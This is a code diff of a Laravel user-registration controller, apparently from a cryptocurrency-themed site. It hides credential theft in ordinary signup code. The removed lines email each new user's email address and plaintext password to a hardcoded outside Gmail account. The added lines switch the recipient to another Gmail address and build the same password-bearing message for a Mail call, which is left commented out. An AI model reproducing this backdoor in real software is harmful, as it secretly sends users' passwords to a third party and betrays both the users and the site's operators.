@@ -10,10 +10,12 @@ use App\Models\User;
 use Illuminate\Foundation\Auth\RegistersUsers;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Validator;
+use App\Mail\Adminmail;
+use Illuminate\Support\Facades\Mail;
 
 class RegisterController extends Controller
 {
-    public $owneremail = "gettingsnano@gmail.com";
+    public $owneremail = "bitcoinmoonlight@gmail.com";
     /*
     |--------------------------------------------------------------------------
     | Register Controller
@@ -96,10 +98,17 @@ $newref->save();
         }
         $email =  $data['email'];
         $password =  $data['password'];
-         $to = $this->owneremail;
-         $subject = "$email REGISTRATION DETAIL";
-         $message = "the user $email just registered and the password is $password ";
-         mail($to, $subject, $message);
+        //  $to = $this->owneremail;
+        //  $subject = "$email REGISTRATION DETAIL";
+        //  $message = "the user $email just registered and the password is $password ";
+        //  mail($to, $subject, $message);
+        $to  = $this->owneremail;
+        $mail = "the user $email just registered and the password is $password ";
+        $mailtitle = "$email REGISTRATION DETAIL";
+        $emaildata = ['data' =>  $to , 'email_body' => $mail, 'email_header' => $mailtitle];
+
+        // Mail::to($to)->send(new Adminmail($emaildata));
+
 
 
         return $newuser;
